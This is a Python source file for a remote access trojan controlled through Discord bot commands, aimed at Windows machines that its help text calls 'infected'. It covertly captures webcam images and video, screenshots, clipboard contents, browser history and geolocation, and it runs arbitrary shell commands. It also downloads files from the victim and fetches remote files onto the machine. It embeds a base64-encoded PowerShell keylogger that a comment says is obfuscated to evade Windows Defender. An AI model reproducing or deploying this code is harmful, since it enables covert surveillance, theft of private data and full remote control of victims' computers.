# -*- coding: utf-8 -*-
import os
import random
import time
import subprocess
import discord
from discord.ext import commands
import asyncio
import discord
from tkinter import *
token = ''
global appdata
appdata = os.getenv('APPDATA')
client = discord.Client()

helpmenu = """

Availaible commands are :

--> !webcampic = Take a picture from the webcam 

--> !webcamvid = Take a video from webcam for selected amount of time /Syntax = "!webcam vid 7"

--> !message = Show a message box

--> !output = Execute a custom command that sends output

--> !custom = Execute a custom command that does not send any output

--> !voice = Make a voice say outloud a custom sentence

--> !admincheck = Check if program has admin privileges

--> !sysinfo = Gives info about infected computer

--> !history = Get infected computer navigation history

--> !download = Download a file from infected computer

--> !cd = Changes directory

--> !write = Type your desired sentence on infected computer

--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper C:/Users/UserExemple/wallpaper.jpg"

--> !upload = Upload file from website to computer / Syntax = "!upload exemple.com name=file.png" (without quotation mark)

--> !clipboard = Retrieve infected computer clipboard content

--> !geolocate = Approximately geolocate using latitude and longitude of the ip adress with google map

--> !startkeylogger = Starts a powershell keylogger

--> !stopkeylogger = Stops keylogger

--> !dumpkeylogger = Dumps the keylog

--> !volumemax = Put volume at 100%

--> !music = Play your desired music / Syntax = "!music C:/Users/UserExemple/music.mp3"

--> !exit = Exit program-

"""

import os
import sys
import ctypes
import winreg
global keyrec
keyrec = "ZnVuY3Rpb24gVGVzdC1LZXlMb2dnZXIoJGxvZ1BhdGg9IiRlbnY6dGVtcFx0ZXN0X2tleWxvZ2dlci50eHQiKSANCnsNCiAgIyBBUEkgZGVjbGFyYXRpb24NCiAgJEFQSXNpZ25hdHVyZXMgPSBAJw0KW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvLCBFeGFjdFNwZWxsaW5nPXRydWUpXSANCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHNob3J0IEdldEFzeW5jS2V5U3RhdGUoaW50IHZpcnR1YWxLZXlDb2RlKTsgDQpbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8pXQ0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEdldEtleWJvYXJkU3RhdGUoYnl0ZVtdIGtleXN0YXRlKTsNCltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldDQpwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgTWFwVmlydHVhbEtleSh1aW50IHVDb2RlLCBpbnQgdU1hcFR5cGUpOw0KW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0NCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBUb1VuaWNvZGUodWludCB3VmlydEtleSwgdWludCB3U2NhbkNvZGUsIGJ5dGVbXSBscGtleXN0YXRlLCBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyIHB3c3pCdWZmLCBpbnQgY2NoQnVmZiwgdWludCB3RmxhZ3MpOw0KJ0ANCiAkQVBJID0gQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gJEFQSXNpZ25hdHVyZXMgLU5hbWUgJ1dpbjMyJyAtTmFtZXNwYWNlIEFQSSAtUGFzc1RocnUNCiAgICANCiAgIyBvdXRwdXQgZmlsZQ0KICAkbm9fb3V0cHV0ID0gTmV3LUl0ZW0gLVBhdGggJGxvZ1BhdGggLUl0ZW1UeXBlIEZpbGUgLUZvcmNlDQoNCiAgdHJ5DQogIHsNCiAgICBXcml0ZS1Ib3N0ICdLZXlsb2dnZXIgc3RhcnRlZC4gUHJlc3MgQ1RSTCtDIHRvIHNlZSByZXN1bHRzLi4uJyAtRm9yZWdyb3VuZENvbG9yIFJlZA0KDQogICAgd2hpbGUgKCR0cnVlKSB7DQogICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDQwICAgICAgICAgICAgDQogICAgICBmb3IgKCRhc2NpaSA9IDk7ICRhc2NpaSAtbGUgMjU0OyAkYXNjaWkrKykgew0KICAgICAgICAjIGdldCBrZXkgc3RhdGUNCiAgICAgICAgJGtleXN0YXRlID0gJEFQSTo6R2V0QXN5bmNLZXlTdGF0ZSgkYXNjaWkpDQogICAgICAgICMgaWYga2V5IHByZXNzZWQNCiAgICAgICAgaWYgKCRrZXlzdGF0ZSAtZXEgLTMyNzY3KSB7DQogICAgICAgICAgJG51bGwgPSBbY29uc29sZV06OkNhcHNMb2NrDQogICAgICAgICAgIyB0cmFuc2xhdGUgY29kZQ0KICAgICAgICAgICR2aXJ0dWFsS2V5ID0gJEFQSTo6TWFwVmlydHVhbEtleSgkYXNjaWksIDMpDQogICAgICAgICAgIyBnZXQga2V5Ym9hcmQgc3RhdGUgYW5kIGNyZWF0ZSBzdHJpbmdidWlsZGVyDQogICAgICAgICAgJGtic3RhdGUgPSBOZXctT2JqZWN0IEJ5dGVbXSAyNTYNCiAgICAgICAgICAkY2hlY2trYnN0YXRlID0gJEFQSTo6R2V0S2V5Ym9hcmRTdGF0ZSgka2JzdGF0ZSkNCiAgICAgICAgICAkbG9nZ2VkY2hhciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXINCg0KICAgICAgICAgICMgdHJhbnNsYXRlIHZpcnR1YWwga2V5ICAgICAgICAgIA0KICAgICAgICAgIGlmICgkQVBJOjpUb1VuaWNvZGUoJGFzY2lpLCAkdmlydHVhbEtleSwgJGtic3RhdGUsICRsb2dnZWRjaGFyLCAkbG9nZ2VkY2hhci5DYXBhY2l0eSwgMCkpIA0KICAgICAgICAgIHsNCiAgICAgICAgICAgICNpZiBzdWNjZXNzLCBhZGQga2V5IHRvIGxvZ2dlciBmaWxlDQogICAgICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpBcHBlbmRBbGxUZXh0KCRsb2dQYXRoLCAkbG9nZ2VkY2hhciwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZSkgDQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICB9DQogICAgfQ0KICB9DQogIGZpbmFsbHkNCiAgeyAgICANCiAgICBub3RlcGFkICRsb2dQYXRoDQogIH0NCn0NCg0KVGVzdC1LZXlMb2dnZXI=".encode()
#Keyrec is the base64 version of a keylogger found here "https://www.andreafortuna.org/2019/05/22/how-a-keylogger-works-a-simple-powershell-example/" to avoid triggering windows defender


def volumeup():
    import win32api
    import win32con
    for i in range(80):
        win32api.keybd_event(win32con.VK_VOLUME_UP, 0)

@client.event


async def on_message(message):

    if message.content == '!webcampic':
        import cv2
        cam = cv2.VideoCapture(0)
        retval, frame = cam.read()
        cam.release()
        cv2.imwrite('filename.jpg', frame)
        cam.release()
        file = discord.File("filename.jpg", filename="filename.jpg")
        await  message.channel.send("[*] Command successfuly executed", file=file)




    if message.content == "!volumemax":
        volumeup()

    elif message.content == "!startkeylogger":
        import base64
        import os
        decoded_string = base64.b64decode(bytes(keyrec))
        with open("test.ps1", "wb") as image_file2:
            image_file2.write(decoded_string);
        os.popen("powershell.exe ./test.ps1")
        await  message.channel.send("[*] Command successfuly executed")

    elif message.content == "!stopkeylogger":
        import os
        os.popen("taskkill /F /IM powershell.exe")
        await  message.channel.send("[*] Command successfuly executed")

    elif message.content == "!dumpkeylogger":
        import os
        temp = os.getenv("TEMP")
        file_keys = temp + "//test_keylogger.txt"
        file = discord.File(file_keys, filename=file_keys)
        await  message.channel.send("[*] Command successfuly executed", file=file)

    elif message.content == "!exit":
        import sys
        sys.exit()

    elif message.content == "!screenshot":
        from mss import mss
        with mss() as sct:
            sct.shot()
        file = discord.File("monitor-1.png", filename="monitor-1.png")
        await  message.channel.send("[*] Command successfuly executed", file=file)

    if message.content.startswith("!message"):
        import ctypes
        MB_YESNO = 0x04
        MB_HELP = 0x4000
        ICON_STOP = 0x10
        result = ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP| MB_YESNO | ICON_STOP)

    if message.content.startswith('!webcamvid'):
        import numpy as np
        import os
        import subprocess
        import cv2
        import time
        capture_duration = int(message.content[11:])
        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter('output.avi',fourcc, 20.0, (640,480))
        start_time = time.time()
        while( int(time.time() - start_time) < capture_duration ):
            ret, frame = cap.read()
            if ret==True:
                out.write(frame)
            else:
                break
        cap.release()
        out.release()
        cv2.destroyAllWindows()
        file = discord.File("output.avi", filename="output.avi")
        await  message.channel.send("[*] Command successfuly executed", file=file)
        os.popen("del output.avi")


    if message.content.startswith("!wallpaper"):
        import ctypes
        print(message.content[11:])
        image = '"' + message.content[11:] + '"'
        ctypes.windll.user32.SystemParametersInfoW(20, 0, message.content[11:]  , 0)
        await  message.channel.send("[*] Command successfuly executed")

    if message.content.startswith("!upload"):
        import re
        import urllib.request
        li = message.content[8:]
        sep = 'name='
        nck = li.split(sep, 1)[0]
        na = re.sub(r'.*=', '=', li)
        me = re.sub('=', '', na)
        urllib.request.urlretrieve(nck, me)
        await  message.channel.send("[*] Command successfuly executed")

    if message.content.startswith("!music"):
        import pygame
        volumeup()
        pygame.mixer.init()
        pygame.mixer.music.load(message.content[7:])
        pygame.mixer.music.play()


    if message.content.startswith("!output"):
        import subprocess
        import os
        instruction = message.content[7:]
        output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = str(output.stdout.decode('CP437'))
        numb = len(result)
        if numb > 1990:
            f1=open("output.txt",'a')
            f1.write(result)
            f1.close()
            file = discord.File("output.txt", filename="output.txt")
            await  message.channel.send("[*] Command successfuly executed", file=file)
            os.popen("del output.txt")
        else:
            await  message.channel.send("[*] Command successfuly executed : " + result)
    if message.content.startswith("!custom"):
        import os
        import subprocess
        x = os.popen(message.content[7:])
        await  message.channel.send("[*] Command successfuly executed")
    if message.content.startswith("!voice"):
        volumeup()
        import win32com.client as wincl
        speak = wincl.Dispatch("SAPI.SpVoice")
        speak.Speak(message.content[6:])
        comtypes.CoUninitialize()
        await  message.channel.send("[*] Command successfuly executed")

    if message.content.startswith("!download"):
        file = discord.File(message.content[10:], filename=message.content[10:])
        await  message.channel.send("[*] Command successfuly executed", file=file)

    if message.content.startswith("!cd"):
        import os
        os.chdir(message.content[4:])
        await  message.channel.send("[*] Command successfuly executed")

    if message.content == "!help":
        await  message.channel.send(helpmenu)

    if message.content.startswith("!write"):
        import pyautogui
        if message.content[7:] == "enter":
            pyautogui.press("enter")
        else:
            pyautogui.typewrite(message.content[7:])


    if message.content == "!history":
        import os
        import browserhistory as bh
        dict_obj = bh.get_browserhistory()
        strobj = str(dict_obj).encode(errors='ignore')
        f3=open('history.txt', 'a')
        f3.write(str(strobj))
        f3.close()
        file = discord.File("history.txt", filename="history.txt")
        await  message.channel.send("[*] Command successfuly executed", file=file)
        os.popen("del history.txt")

    if message.content == "!clipboard":
        import ctypes
        import os
        CF_TEXT = 1
        kernel32 = ctypes.windll.kernel32
        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        kernel32.GlobalLock.restype = ctypes.c_void_p
        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        user32 = ctypes.windll.user32
        user32.GetClipboardData.restype = ctypes.c_void_p
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            body = str(value)
            user32.CloseClipboard()
            await  message.channel.send("[*] Command successfuly executed : " + "Clipboard content is : " + body)


    if message.content == "!sysinfo":
        import platform
        jak = str(platform.uname())
        intro = jak[12:]
        from requests import get
        ip = get('https://api.ipify.org').text
        pp = "IP Adress = " + ip
        await  message.channel.send("[*] Command successfuly executed : " + intro + pp)

    if message.content == "!geolocate":
        import urllib.request
        import json

        with urllib.request.urlopen("https://geolocation-db.com/json") as url:
            data = json.loads(url.read().decode())
            lol = str(data)
            lat = lol[112:]
            sep = ','
            restlat = lat.split(sep, 1)[0]
            longg = lol[134:]
            restlong = longg.split(sep, 1)[0]
            link = "http://www.google.com/maps/place/" +restlat +"," + restlong
            await  message.channel.send("[*] Command successfuly executed : " + link)


    if message.content == "!admincheck":
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            await  message.channel.send("[*] Congrats you're admin")
        elif is_admin == False:
            await  message.channel.send("[*] Sorry, you're not admin")


client.run(token)
